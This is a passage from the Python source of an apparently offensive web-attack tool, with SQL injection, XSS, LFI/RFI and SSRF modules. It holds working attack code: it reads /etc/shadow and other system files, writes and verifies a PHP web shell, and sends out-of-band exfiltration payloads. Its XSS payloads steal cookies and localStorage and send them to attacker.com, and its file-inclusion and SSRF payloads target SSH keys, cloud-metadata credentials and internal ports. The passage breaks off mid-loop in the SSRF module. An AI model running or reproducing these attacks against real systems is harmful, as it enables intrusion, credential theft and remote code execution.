        print(f"        [INFO] Attempting file read/write for MySQL...")
        sensitive_files = [
            "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/mysql/my.cnf",
            "/var/www/html/config.php", "/var/www/html/index.php",
            "C:\\Windows\\win.ini", "C:\\boot.ini", "C:\\xampp\\apache\\conf\\httpd.conf"
        ]
        for file_path in sensitive_files:
            for col_idx in string_columns:
                load_file_payload = f"1' UNION SELECT {','.join(['NULL']*(col_idx-1) + [f'LOAD_FILE(\'{file_path}\')'] + ['NULL']*(num_columns-col_idx))} --"
                response_file, _ = send_and_check_func(load_file_payload, param_name, 0)
                if response_file and response_file.status_code == 200 and (file_path.split('/')[-1] in response_file.text or "root:x:0:0" in response_file.text or "[fonts]" in response_file.text):
                    extracted_info[f"file_content_{file_path}"] = response_file.text[:500]
                    print(f"            [CRITICAL] Leaked content of {file_path}: {response_file.text[:100]}...")
                    break # Found content, move to next file

        # Attempt to write a basic PHP shell
        php_shell_content = "<?php system($_GET['cmd']); ?>"
        shell_path = "/var/www/html/shell.php"
        for col_idx in string_columns:
            write_shell_payload = f"1' UNION SELECT {','.join(['NULL']*(col_idx-1) + [f'\'{php_shell_content}\''] + ['NULL']*(num_columns-col_idx))} INTO OUTFILE '{shell_path}' --"
            response_write, _ = send_and_check_func(write_shell_payload, param_name, 0)
            if response_write and response_write.status_code == 200: # Success often means no error
                # Verify if the shell was written by trying to access it
                verify_shell_url = f"{target_url.split('?')[0].rstrip('/')}{shell_path}?cmd=id"
                response_verify, _ = send_and_check_func("", "", 0, url=verify_shell_url) # Direct GET request
                if response_verify and response_verify.status_code == 200 and "uid=" in response_verify.text:
                    extracted_info["php_shell_uploaded"] = shell_path
                    print(f"            [CRITICAL] PHP shell uploaded to {shell_path} and confirmed executable!")
                    break

    # 6. OOB Integration (Conceptual - requires an OOB listener)
    # This part would typically involve sending payloads that trigger DNS/HTTP requests to an attacker-controlled domain.
    # The results would then be checked on the attacker's side. For this simulation, we'll just log the attempt.
    oob_domain_placeholder = "YOUR_OOB_DOMAIN.com" # User would replace this
    oob_payloads = [
        f"1' AND LOAD_FILE(CONCAT('\\\\',(SELECT HEX(SUBSTRING(@@version,1,10))),'.{oob_domain_placeholder}\\test.txt'))--", # MySQL OOB DNS
        f"1' AND master..xp_cmdshell('nslookup (SELECT @@version).{oob_domain_placeholder}')--", # MSSQL OOB DNS
        f"1' AND UTL_HTTP.REQUEST('http://{oob_domain_placeholder}/'||(SELECT user FROM DUAL))--", # Oracle OOB HTTP
        f"1' AND (SELECT pg_send_query(pg_connect('host={oob_domain_placeholder} port=80 dbname=http query=(SELECT version())')) IS NOT NULL)--", # PostgreSQL OOB HTTP (Conceptual)
    ]
    for payload in oob_payloads:
        response, _ = send_and_check_func(payload, param_name, 0)
        if response and response.status_code == 200: # OOB often doesn't return errors
            print(f"            [INFO] OOB payload sent: {payload[:50]}... Check your OOB listener for interactions.")
            extracted_info["oob_attempt"] = "Check OOB listener for interactions."
            break

    return extracted_info if extracted_info else None

# --- XSS Module ---

def perform_xss_attack(target_url, method="GET", data=None, headers=None, cookies=None, timeout=10, verify_ssl=True):
    """
    Performs various Cross-Site Scripting (XSS) attacks on the target URL.

    Args:
        target_url (str): The URL to attack.
        method (str): HTTP method (GET or POST).
        data (dict): POST data.
        headers (dict): HTTP headers.
        cookies (dict): HTTP cookies.
        timeout (int): Request timeout in seconds.
        verify_ssl (bool): Whether to verify SSL certificates.

    Returns:
        list: A list of dictionaries, each representing a detected vulnerability or information.
    """
    print(f"[+] Starting XSS scan for: {target_url}")
    vulnerabilities = []

    xss_payloads = [
        # Basic reflected XSS
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "';alert(1)//",
        "\"><script>alert(1)</script>",
        "<svg/onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=\"javascript:alert(1)\"></iframe>",
        "<a href=\"javascript:alert(1)\">Click Me</a>",
        
        # HTML entity encoding bypass
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
        
        # URL encoding bypass
        "%3cscript%3ealert(1)%3c/script%3e",
        
        # Obfuscated/Tricky payloads
        "<scr<script>ipt>alert(1)</scr<script>ipt>",
        "<img src=x onerrOr=alert(1)>", # Case variation
        "<svg onload=alert(1)//", # Comment to break attributes
        
        # XSS for data extraction (document.cookie)
        "<script>fetch('//attacker.com/log?c='+document.cookie)</script>",
        "<img src=x onerror=this.src='//attacker.com/log?c='+document.cookie>",
        
        # XSS for localStorage access
        "<script>fetch('//attacker.com/log?ls='+JSON.stringify(localStorage))</script>",
        
        # XSS for internal API calls (example)
        "<script>fetch('/api/v1/users', {method: 'POST', body: JSON.stringify({name: 'xss'})})</script>",
        
        # DOM XSS (requires client-side analysis, but payloads can trigger it)
        "<img src=\"#\" onerror=\"eval(location.hash.substr(1))\">#alert(1)",
        
        # Mutation XSS (example, often context-dependent)
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        
        # --- Event Handlers (Expanded) ---
        "<body onpageshow=alert(1)>",
        "<body onresize=alert(1)>",
        "<div onwheel=alert(1)>SCROLL</div>",
        "<input onkeyup=alert(1)>",
        "<input onchange=alert(1)>",
        "<form onsubmit=alert(1)><input type=submit></form>",
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<picture><img src=x onerror=alert(1)></picture>",
        "<details ontoggle=alert(1)><summary>Click</summary></details>",
        "<image src=x onerror=alert(1)>",
        "<math><a xlink:href=javascript:alert(1)>click</a></math>",
        "<animate onbegin=alert(1)>",
        "<foreignObject><script>alert(1)</script></foreignObject>",
        "<a onpointerover=alert(1)>Move mouse here</a>",
        "<div oncontextmenu=alert(1)>Right-click here</div>",
        "<div oncopy=alert(1)>Copy this text</div>",
        "<div oncut=alert(1)>Cut this text</div>",
        "<div onpaste=alert(1)>Paste here</div>",
        "<input onkeydown=alert(1)>",
        "<marquee onbounce=alert(1)>bounce</marquee>",
        "<marquee onfinish=alert(1)>finish</marquee>",
        "<body onhashchange=alert(1)>",
        "<body onpagehide=alert(1)>",
        "<body onstorage=alert(1)>",
        "<body onunload=alert(1)>",
        "<svg><g/onload=alert(1)>",
        "<svg><foreignObject><body/onload=alert(1)>",

        # --- Encoding & Bypass Variations (Expanded) ---
        "jav&#x09;ascript:alert(1)", # Tab in JS URI
        "java\0script:alert(1)", # Null byte in JS URI
        "<img src=x:x onerror=alert(1)>", # Colon in src
        "<img src=`x` onerror=alert(1)>", # Backticks in src
        "<img src='/' onerror=alert(1)>", # Slash in src
        "<script>/* */alert(1)</script>", # Comment in script
        "<script>eval('ale'+'rt(1)')</script>", # Eval obfuscation
        "<script>window['a'+'lert'](1)</script>", # Bracket notation
        "<script >alert(1)</script >", # Trailing space in tag
        "<script\n>alert(1)</script>", # Newline in tag
        "<script\t>alert(1)</script>", # Tab in tag
        "<img src=x onerror\n=\nalert(1)>", # Newlines in attribute
        "<img src=x onerror\t=\talert(1)>", # Tabs in attribute
        "<img src=x oNeRrOr=alert(1)>", # Case variation in attribute
        "<img src=x onerror=alert`1`>", # Backticks for alert
        "<img src=x onerror=alert(1)//>", # Comment in JS
        "<img src=x onerror=alert(1)<!--", # HTML comment in JS
        "&#x61;&#x6c;&#x65;&#x72;&#x74;(1)", # HTML entity encoding
        "eval(String.fromCharCode(97,108,101,114,116,40,49,41))", # JS char code
        "javascript:alert&#x28;1&#x29;", # HTML entity for parenthesis
        "javascript:alert&#40;1&#41;", # HTML entity for parenthesis
        "javascript:alert%281%29", # URL encoded parenthesis
        "javascript:alert%0a(1)", # Newline bypass
        "javascript:alert%0d(1)", # Carriage return bypass
        "javascript:alert%09(1)", # Tab bypass
        "javascript:alert%00(1)", # Null byte bypass
        "javascript:alert(1)//", # Comment bypass
        "javascript:alert(1)/*", # Multi-line comment bypass
        "javascript:alert(1)<!--", # HTML comment bypass
        "javascript:alert(1);", # Semicolon
        "javascript:alert(1) ", # Trailing space
        "javascript:alert(1)\t", # Trailing tab
        "javascript:alert(1)\n", # Trailing newline
        "javascript:alert(1)\r", # Trailing carriage return

        # --- Data URIs (New) ---
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", # Base64 encoded script
        "data:text/html,<script>alert(1)</script>", # Direct script
        "data:text/html;charset=utf-8;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", # Base64 with charset

        # --- Polyglots (More Advanced) ---
        "\"'';!--\"<XSS>=&{()}",
        "<svg onload=alert(1) class=a><script>alert(1)</script>",
        "<img src=x onerror=alert(1)><script>alert(1)</script>",
        "<a href=\"javascript:alert(1)\">CLICK</a><script>alert(1)</script>",
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/alert(1)//'>",
        "'\";alert(1);//",
        "'-alert(1)-'",
        "\"-alert(1)-\"",
        "javascript:alert(1)",
        "{{alert(1)}}", # Template engine XSS
        "<%= alert(1) %>",
        "*{{alert(1)}}",
        "#{alert(1)}",
        "@{alert(1)}",
        "[[alert(1)]]",
        "@(1+1)",
        "#{process.mainModule.require('child_process').execSync('id')}", # Node.js RCE via XSS
        "{{''.__class__.__mro__[1].__subclasses__()[_].__init__.__globals__['os'].popen('id').read()}}", # Python RCE via XSS (needs index fuzzing)

        # --- DOM XSS specific payloads (Expanded) ---
        "javascript:alert(document.domain)",
        "javascript:alert(location.hash)",
        "javascript:alert(location.href)",
        "javascript:alert(document.cookie)",
        "javascript:eval(unescape(location.hash.substr(1)))",
        "javascript:window.name=location.hash.substr(1);eval(window.name)",
        "javascript:document.write('<img src=x onerror=alert(1)>')",

        # --- Mutation XSS (mXSS) (Expanded) ---
        "<style><img src=\"</style><img src=x onerror=alert(1)\">",
        "<iframe srcdoc='&lt;img src&equals;x onerror&equals;alert(1)&gt;'></iframe>",
    ]
    # Function to send request and check for reflected payload
    def send_and_check_xss(payload, param_name):
        current_data = data.copy() if data else {}
        current_headers = headers.copy() if headers else {}
        current_cookies = cookies.copy() if cookies else {}

        if method == "GET":
            test_url = f"{target_url}?{param_name}={quote_plus(payload)}"
            try:
                response = requests.get(test_url, headers=current_headers, cookies=current_cookies, timeout=timeout, verify=verify_ssl)
                return response
            except requests.exceptions.RequestException as e:
                print(f"[-] Request failed: {e}")
                return None
        elif method == "POST":
            current_data[param_name] = payload
            try:
                response = requests.post(target_url, data=current_data, headers=current_headers, cookies=current_cookies, timeout=timeout, verify=verify_ssl)
                return response
            except requests.exceptions.RequestException as e:
                print(f"[-] Request failed: {e}")
                return None
        return None

    # Identify injectable parameters (simplified for now, assumes parameters are known or discovered elsewhere)
    parameters_to_test = ['q', 'search', 'name', 'input'] # Placeholder, should be dynamically discovered

    for param_name in parameters_to_test:
        print(f"[*] Testing parameter: {param_name}")

        for payload in xss_payloads:
            print(f"    [>] Trying payload: {payload[:50]}...") # Truncate long payloads for display
            response = send_and_check_xss(payload, param_name)

            if response is None:
                continue

            # Check for reflected XSS (simple reflection check)
            # A more robust check would involve parsing HTML and looking for script execution.
            if payload in response.text:
                vulnerabilities.append({
                    "type": "Cross-Site Scripting (Reflected)",
                    "severity": "High",
                    "parameter": param_name,
                    "payload": payload,
                    "response_snippet": response.text[:500], # Snippet of the response
                    "poc_code": f"import requests\nrequests.request(method='{method}', url='{target_url}', {{'data=' + str(data) if data else ''}}, {{'headers=' + str(headers) if headers else ''}}, {{'cookies=' + str(cookies) if cookies else ''}}, timeout={timeout}, verify={verify_ssl})" # Placeholder, needs actual PoC generation
                })
                print(f"        [!!!] XSS (Reflected) detected in {param_name}!")
                # For data extraction/exploitation payloads, we'd need to check attacker.com logs or similar.
                # This is a placeholder for future integration with a listener.
                if "attacker.com/log" in payload:
                    vulnerabilities[-1]["exploitation_attempt"] = "Attempted data exfiltration (check attacker.com logs)"
                
    return vulnerabilities

# --- LFI/RFI Module ---

def perform_lfi_rfi_attack(target_url, method="GET", data=None, headers=None, cookies=None, timeout=10, verify_ssl=True):
    """
    Performs various Local File Inclusion (LFI) and Remote File Inclusion (RFI) attacks on the target URL.

    Args:
        target_url (str): The URL to attack.
        method (str): HTTP method (GET or POST).
        data (dict): POST data.
        headers (dict): HTTP headers.
        cookies (dict): HTTP cookies.
        timeout (int): Request timeout in seconds.
        verify_ssl (bool): Whether to verify SSL certificates.

    Returns:
        list: A list of dictionaries, each representing a detected vulnerability or information.
    """
    print(f"[+] Starting LFI/RFI scan for: {target_url}")
    vulnerabilities = []

    lfi_rfi_payloads = [
        # Basic LFI payloads
        "../../../../etc/passwd",
        "../../../../windows/win.ini",
        "....//....//....//....//etc/passwd", # Double URL encoding
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", # URL encoded
        "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", # Double URL encoded
        "file:///etc/passwd", # File URI scheme
        
        # Null Byte and Path Truncation
        "../../../../etc/passwd%00",
        "../../../../etc/passwd%00.jpg",
        "../../../../etc/passwd.", # Path truncation (PHP < 5.3)
        
        # PHP Wrappers
        "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
        "php://filter/resource=../../../../etc/passwd",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQtJ10pOyA/Pg==", # Base64 encoded PHP shell
        "phar://../../../../path/to/archive.phar/file", # Example phar wrapper
        "zip://../../../../path/to/archive.zip%23file", # Example zip wrapper
        
        # Cloud Metadata (AWS, GCP, Azure)
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanstalk-ec2-role", # AWS
        "http://169.254.169.254/latest/meta-data/hostname", # AWS
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", # GCP
        "http://169.254.169.254/metadata/instance?api-version=2017-08-01", # Azure
        
        # Common sensitive files
        "../../../../proc/self/environ",
        "../../../../proc/self/cmdline",
        "../../../../var/log/apache2/access.log",
        "../../../../var/log/apache2/error.log",
        "../../../../var/log/nginx/access.log",
        "../../../../var/log/nginx/error.log",
        "../../../../WEB-INF/web.xml", # Java web apps
        "../../../../WEB-INF/classes/application.properties", # Spring Boot
        "../../../../config/database.yml", # Ruby on Rails
        "../../../../application/config/database.php", # CodeIgniter
        "../../../../wp-config.php", # WordPress
        # --- Traversal Variations (Increased Depth) ---
        *[f"../" * i + "etc/passwd" for i in range(5, 21)], # Increased depth
        *[f"..\\\\" * i + "windows\\\\win.ini" for i in range(5, 21)], # Increased depth
        *[f"....//" * i + "etc/passwd" for i in range(5, 21)], # Increased depth
        *[f"....\\\\" * i + "windows\\\\win.ini" for i in range(5, 21)], # Increased depth

        # --- Encoding Variations (Expanded) ---
        "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
        "%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini",
        "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", # UTF-8 / bypass
        "..%c0%5c..%c0%5c..%c0%5c..%c0%5cwindows%c0%5cwin.ini",

        # --- Null Byte and Path Truncation (Expanded) ---
        "..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini%00",
        "..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini%00.txt",
        "../../../../etc/passwd%20",
        # Path truncation with many dots (simulating max path length)
        "../../../../etc/passwd" + "." * 250,
        "../../../../etc/passwd" + "/" * 250, # Directory traversal with many slashes

        # --- PHP Wrappers (Expanded) ---
        "php://filter/convert.iconv.utf-8.utf-7/resource=/etc/passwd",
        "php://filter/read=string.rot13/resource=/etc/passwd",
        "php://filter/zlib.decompress/resource=/etc/passwd",
        "php://filter/string.toupper/resource=/etc/passwd",
        "php://filter/string.tolower/resource=/etc/passwd",
        "php://filter/string.strip_tags/resource=index.php",
        "data://text/plain,<?php phpinfo(); ?>",
        "php://input", # Requires POST data
        "expect://id", # If expect module is loaded
        "php://fd/1", "php://memory", "php://temp",
        "glob:///etc/passwd",
        "php://filter/string.strip_tags|convert.base64-encode/resource=/etc/passwd",
        "php://filter/zlib.decompress|convert.base64-encode/resource=/var/log/apache2/access.log",
        "file:///proc/self/fd/0", "file:///proc/self/fd/1", # File descriptors
        "glob:///*", "glob://*/*", # Glob patterns
        "php://filter/resource=./index.php", # Current directory
        "php://filter/resource=../index.php",
        "php://filter/resource=../../index.php",
        "php://filter/read=string.strip_tags/resource=php://input",
        "phar://archive.zip/file.txt",
        "zip://archive.zip#file.txt",
        "data:text/plain,<? echo system('id'); ?>",
        "data:text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJ2lkJyk7ID8+", # base64 encoded `<?php echo system('id'); ?>`
        "expect://ls", # If expect module is loaded

        # --- Sensitive Files (Linux) (Expanded) ---
        "/etc/shadow", "/etc/group", "/etc/hosts", "/etc/issue", "/etc/motd",
        "/etc/fstab", "/etc/crontab", "/etc/sysctl.conf", "/etc/resolv.conf",
        "/etc/profile", "/etc/bashrc",
        "~/.bash_history", "~/.ssh/id_rsa", "~/.ssh/authorized_keys",
        "/var/log/auth.log", "/var/log/syslog", "/var/log/dmesg",
        "/var/log/apache2/access.log", "/var/log/apache2/error.log",
        "/var/log/nginx/access.log", "/var/log/nginx/error.log",
        "/var/log/httpd/access_log", "/var/log/httpd/error_log",
        "/var/log/vsftpd.log", "/var/log/sshd.log", "/var/log/mail.log", "/var/log/cron.log", "/var/log/messages",
        "/proc/self/environ", "/proc/self/cmdline", "/proc/self/status", "/proc/self/mounts",
        "/proc/net/arp", "/proc/net/route", "/proc/net/tcp", "/proc/net/udp",
        "/proc/version", "/proc/cpuinfo", "/proc/meminfo", "/proc/sched_debug",
        "/etc/ssh/sshd_config", "/etc/apache2/apache2.conf", "/etc/nginx/nginx.conf",
        "/etc/httpd/conf/httpd.conf", "/etc/lighttpd/lighttpd.conf", "/etc/vsftpd.conf",
        "/etc/sudoers", "/etc/passwd-", "/etc/shadow-", "/etc/gshadow",
        "/var/run/dmesg.boot", "/var/log/lastlog", "/var/log/wtmp", "/var/log/btmp",
        "/var/log/faillog", "/var/log/daemon.log", "/var/log/kern.log",
        "/opt/lampp/logs/access_log", "/usr/local/apache/logs/access_log",
        "/usr/local/nginx/logs/access.log", "/usr/local/var/log/nginx/access.log",
        "~/.bashrc", "~/.profile", "~/.zshrc", "~/.tmux.conf", "~/.vimrc",
        "/root/.ssh/id_rsa", "/home/user/.ssh/id_rsa", "/root/.bash_history",
        "/proc/self/attr/current", "/proc/self/cgroup", "/proc/self/comm",
        "/proc/mounts", "/proc/config.gz", "/proc/kmsg",
        "/sys/class/dmi/id/product_name", "/sys/firmware/acpi/tables/DSDT",

        # --- Sensitive Files (Windows) (Expanded) ---
        "C:/boot.ini", "C:/autoexec.bat", "C:/config.sys",
        "C:/Windows/System32/drivers/etc/hosts",
        "C:/Windows/repair/sam",
        "C:/Windows/php.ini", "C:/php/php.ini",
        "C:/xampp/apache/conf/httpd.conf",
        "C:/Users/Administrator/NTUser.dat",
        "C:/Windows/System32/LogFiles/W3SVC1/ex000000.log", # IIS logs
        "C:/Windows/System32/inetsrv/config/applicationHost.config", # IIS config
        "C:/Program Files/Apache Group/Apache2/conf/httpd.conf",
        "C:/Program Files/nginx-1.x.x/conf/nginx.conf",
        "C:/Program Files/php/php.ini",
        "C:/Users/Public/Desktop/desktop.ini",
        "C:/inetpub/wwwroot/web.config",
        "C:/Windows/win.ini.bak", "C:/Windows/system.ini",
        "C:/Program Files/MySQL/MySQL Server 8.0/my.ini",
        "C:/Program Files/PostgreSQL/14/data/postgresql.conf",
        "C:/Windows/Panther/Unattend.xml", # Windows unattended installation files

        # --- RFI Payloads (Expanded) ---
        "http://evil.com/rfi_test.txt",
        "https://evil.com/rfi_test.txt",
        "http://google.com",
        "//google.com",
        "ftp://evil.com/file.txt",
        "https://raw.githubusercontent.com/someuser/somerepo/main/shell.txt",

        # --- Cloud Metadata (AWS, GCP, Azure) (Expanded) ---
        "/var/lib/cloud/instance/user-data.txt", # AWS user-data
        "/var/lib/cloud/instance/vendordata.txt",
        "/etc/google/instance", # GCP instance metadata
        "/var/az_metadata", # Azure metadata
    ]
    # Function to send request and check for file content
    def send_and_check_lfi_rfi(payload, param_name):
        current_data = data.copy() if data else {}
        current_headers = headers.copy() if headers else {}
        current_cookies = cookies.copy() if cookies else {}

        if method == "GET":
            test_url = f"{target_url}?{param_name}={quote_plus(payload)}"
            try:
                response = requests.get(test_url, headers=current_headers, cookies=current_cookies, timeout=timeout, verify=verify_ssl)
                return response
            except requests.exceptions.RequestException as e:
                print(f"[-] Request failed: {e}")
                return None
        elif method == "POST":
            current_data[param_name] = payload
            try:
                response = requests.post(target_url, data=current_data, headers=current_headers, cookies=current_cookies, timeout=timeout, verify=verify_ssl)
                return response
            except requests.exceptions.RequestException as e:
                print(f"[-] Request failed: {e}")
                return None
        return None

    # Identify injectable parameters (simplified for now)
    parameters_to_test = ['file', 'page', 'view', 'load', 'template'] # Placeholder, should be dynamically discovered

    for param_name in parameters_to_test:
        print(f"[*] Testing parameter: {param_name}")

        for payload in lfi_rfi_payloads:
            print(f"    [>] Trying payload: {payload[:50]}...") # Truncate long payloads for display
            response = send_and_check_lfi_rfi(payload, param_name)

            if response is None:
                continue

            # Check for LFI/RFI indicators
            if "root:x:0:0" in response.text or "for 16-bit app support" in response.text.lower() or "aws_access_key_id" in response.text or "metadata.google.internal" in response.text:
                vulnerabilities.append({
                    "type": "Local/Remote File Inclusion",
                    "severity": "High",
                    "parameter": param_name,
                    "payload": payload,
                    "response_snippet": response.text[:500], # Snippet of the response
                    "poc_code": f"import requests\nrequests.request(method='{method}', url='{target_url}', {{'data=' + str(data) if data else ''}}, {{'headers=' + str(headers) if headers else ''}}, {{'cookies=' + str(cookies) if cookies else ''}}, timeout={timeout}, verify={verify_ssl})" # Placeholder
                })
                print(f"        [!!!] LFI/RFI detected in {param_name}!")
                # Attempt to extract content if it's /etc/passwd or similar
                if "root:x:0:0" in response.text:
                    vulnerabilities[-1]["extracted_content"] = "Found /etc/passwd content."
                elif "aws_access_key_id" in response.text:
                    vulnerabilities[-1]["extracted_content"] = "Found AWS credentials."
                elif "metadata.google.internal" in response.text:
                    vulnerabilities[-1]["extracted_content"] = "Found GCP metadata."
                
            # Check for PHP wrapper execution (e.g., base64 encoded content)
            if "php://filter/convert.base64-encode" in payload and "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQtJ10pOyA/Pg==" in response.text: # Example for base64 encoded PHP shell
                 vulnerabilities.append({
                    "type": "Local File Inclusion (PHP Wrapper - Base64 Encoded Source)",
                    "severity": "Medium",
                    "parameter": param_name,
                    "payload": payload,
                    "response_snippet": response.text[:500],
                    "poc_code": f"import requests\nrequests.request(method='{method}', url='{target_url}', {{'data=' + str(data) if data else ''}}, {{'headers=' + str(headers) if headers else ''}}, {{'cookies=' + str(cookies) if cookies else ''}}, timeout={timeout}, verify={verify_ssl})"
                })
                 print(f"        [!!!] LFI (PHP Wrapper - Base64 Encoded Source) detected in {param_name}!")

    return vulnerabilities

# --- SSRF Module ---

def perform_ssrf_attack(target_url, method="GET", data=None, headers=None, cookies=None, timeout=10, verify_ssl=True):
    """
    Performs various Server-Side Request Forgery (SSRF) attacks on the target URL.

    Args:
        target_url (str): The URL to attack.
        method (str): HTTP method (GET or POST).
        data (dict): POST data.
        headers (dict): HTTP headers.
        cookies (dict): HTTP cookies.
        timeout (int): Request timeout in seconds.
        verify_ssl (bool): Whether to verify SSL certificates.

    Returns:
        list: A list of dictionaries, each representing a detected vulnerability or information.
    """
    print(f"[+] Starting SSRF scan for: {target_url}")
    vulnerabilities = []

    ssrf_payloads = [
        # Localhost variations
        "127.0.0.1",
        "localhost",
        "0.0.0.0",
        "0", # Dot-less IP
        "2130706433", # Integer IP for 127.0.0.1
        "0x7f000001", # Hex IP for 127.0.0.1
        "[::1]", # IPv6 localhost
        "%31%32%37%2e%30%2e%30%2e%31", # URL encoded 127.0.0.1
        
        # Cloud Metadata Endpoints
        "http://169.254.169.254/latest/meta-data/", # AWS EC2 Metadata
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/", # AWS IAM Credentials
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", # GCP Metadata
        "http://169.254.169.254/metadata/instance?api-version=2017-08-01", # Azure Metadata
        
        # Internal IP ranges (examples)
        "10.0.0.1",
        "172.16.0.1",
        "192.168.1.1",
        
        # Various schemes
        "dict://localhost:6379/info", # Redis
        "gopher://localhost:80/_GET%20/%0A%0A", # Gopher to HTTP GET
        "ftp://localhost:21/", # FTP
        "file:///etc/passwd", # File scheme (often blocked, but worth trying)
        # --- Localhost variations (Expanded) ---
        "127.0.0.1.xip.io", # DNS rebinding bypass
        "127.0.0.1.nip.io", # DNS rebinding bypass
        "http://[::1]/", # IPv6 with scheme
        "http://0/", # Dot-less IP with scheme
        "http://0x7f000001/", # Hex IP with scheme
        "http://127.1/", # Shorthand IP
        "http://127.0.0.1:80/", # Explicit port
        "http://127.0.0.1:8080/", # Common internal port
        "http://127.0.0.1:9000/", # Common internal port

        # --- Cloud Metadata Endpoints (Expanded) ---
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanstalk-ec2-role", # AWS specific role
        "http://169.254.169.254/latest/user-data", # AWS user data
        "http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys", # GCP SSH keys
        "http://169.254.169.254/metadata/instance/compute?api-version=2017-08-01&format=json", # Azure compute info
        "http://100.100.100.200/latest/meta-data/", # Alibaba Cloud
        "http://100.100.100.200/latest/user-data", # Alibaba Cloud

        # --- Internal IP ranges (Expanded) ---
        *[f"10.0.{i}.1" for i in range(0, 5)], # 10.0.X.1
        *[f"172.16.{i}.1" for i in range(0, 5)], # 172.16.X.1
        *[f"192.168.{i}.1" for i in range(0, 5)], # 192.168.X.1
        "10.0.0.0/8", # CIDR notation (conceptual, needs parsing)
        "172.16.0.0/12", # CIDR notation
        "192.168.0.0/16", # CIDR notation

        # --- Various schemes (Expanded) ---
        "gopher://localhost:80/_POST%20/admin%0AContent-Type:%20application/x-www-form-urlencoded%0AContent-Length:%2015%0A%0Auser=admin&pass=pass", # Gopher to HTTP POST
        "gopher://localhost:11211/_stats", # Gopher to Memcached
        "gopher://localhost:3306/_", # Gopher to MySQL (requires specific payload)
        "gopher://localhost:5432/_", # Gopher to PostgreSQL (requires specific payload)
        "gopher://localhost:27017/_", # Gopher to MongoDB (requires specific payload)
        "ldap://localhost:389/o=example,c=us??sub?(cn=*)", # LDAP
        "tftp://localhost/file.txt", # TFTP
        "smb://localhost/share", # SMB
        "nfs://localhost/share", # NFS
        "data:text/plain,Hello%20SSRF", # Data URI
        "php://filter/resource=http://localhost/index.php", # PHP filter with URL

        # --- Internal Port Scanning (New) ---
        *[f"http://127.0.0.1:{p}" for p in [22, 80, 443, 3306, 5432, 6379, 8000, 8080, 9000, 27017]], # Common ports
        *[f"http://localhost:{p}" for p in [22, 80, 443, 3306, 5432, 6379, 8000, 8080, 9000, 27017]],
        *[f"http://10.0.0.1:{p}" for p in [22, 80, 443, 3306, 5432, 6379, 8000, 8080, 9000, 27017]],

        # --- URL Encoding Bypass ---
        "http://%6c%6f%63%61%6c%68%6f%73%74/", # Hex encoded localhost
        "http://127.0.0.1%00.evil.com/", # Null byte bypass
        "http://127.0.0.1%23.evil.com/", # Hash bypass
        "http://127.0.0.1%2f.evil.com/", # Slash bypass
        "http://127.0.0.1%5c.evil.com/", # Backslash bypass
        "http://127.0.0.1%252f.evil.com/", # Double encoded slash
        "http://127.0.0.1%255c.evil.com/", # Double encoded backslash
        "http://127.0.0.1%2e%2e%2f.evil.com/", # Dot-dot-slash bypass
        "http://127.0.0.1%252e%252e%252f.evil.com/", # Double encoded dot-dot-slash
        "http://127.0.0.1%2500.evil.com/", # Double encoded null byte
        "http://127.0.0.1%0a.evil.com/", # Newline bypass
        "http://127.0.0.1%0d.evil.com/", # Carriage return bypass
        "http://127.0.0.1%09.evil.com/", # Tab bypass
        "http://127.0.0.1%20.evil.com/", # Space bypass
        "http://127.0.0.1%2520.evil.com/", # Double encoded space
        "http://127.0.0.1%250a.evil.com/", # Double encoded newline
        "http://127.0.0.1%250d.evil.com/", # Double encoded carriage return
        "http://127.0.0.1%2509.evil.com/", # Double encoded tab
    ]
    # Function to send request and check for SSRF indicators
    def send_and_check_ssrf(payload, param_name):
        current_data = data.copy() if data else {}
        current_headers = headers.copy() if headers else {}
        current_cookies = cookies.copy() if cookies else {}

        # The target_url is where the SSRF vulnerability exists,
        # and the payload is the URL that the server will fetch.
        # We need to construct the request to the target_url with the payload.
        # Assuming the vulnerable parameter takes a URL as input.
        
        if method == "GET":
            test_url = f"{target_url}?{param_name}={quote_plus(payload)}"
            try:
                response = requests.get(test_url, headers=current_headers, cookies=current_cookies, timeout=timeout, verify=verify_ssl)
                return response
            except requests.exceptions.RequestException as e:
                print(f"[-] Request failed: {e}")
                return None
        elif method == "POST":
            current_data[param_name] = payload
            try:
                response = requests.post(target_url, data=current_data, headers=current_headers, cookies=current_cookies, timeout=timeout, verify=verify_ssl)
                return response
            except requests.exceptions.RequestException as e:
                print(f"[-] Request failed: {e}")
                return None
        return None

    # Identify injectable parameters (simplified for now)
    parameters_to_test = ['url', 'uri', 'link', 'image_url', 'callback'] # Placeholder, should be dynamically discovered

    for param_name in parameters_to_test:
        print(f"[*] Testing parameter: {param_name}")

        for payload in ssrf_payloads:
            print(f"    [>] Trying payload: {payload[:50]}...") # Truncate long payloads for display
            response = send_and_check_ssrf(payload, param_name)

            if response is None:
                continue

